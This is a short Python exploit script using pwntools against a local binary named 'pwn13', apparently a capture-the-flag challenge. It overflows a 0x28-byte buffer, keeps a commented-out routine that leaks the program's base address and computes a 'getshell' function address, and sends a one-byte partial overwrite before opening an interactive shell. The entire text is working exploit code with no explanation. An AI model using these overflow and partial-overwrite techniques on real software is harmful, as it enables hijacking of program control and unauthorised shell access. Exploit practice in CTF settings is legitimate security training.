from pwn import *
context.binary = './pwn13'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = elf.libc

p = process('./pwn13')

def dbg():
	raw_input()


def game(msg):
	p.sendlineafter('your choice:', '1')
	p.recvline()
	p.send(msg)

"""leak address
payload = 'a'*0x28
game(payload)

p.recvuntil('a'*0x28)
base_addr = u64(p.recvline().strip('\x0a').ljust(8, '\x00')) & 0xfffffffffffff000
print "base_addr ==> " + hex(base_addr)

getshell_addr = base_addr + 0xA02

cover = getshell_addr & 0xffff
"""

payload = 'a'*0x28 + '\x50'
game(payload)


p.interactive()
p.close()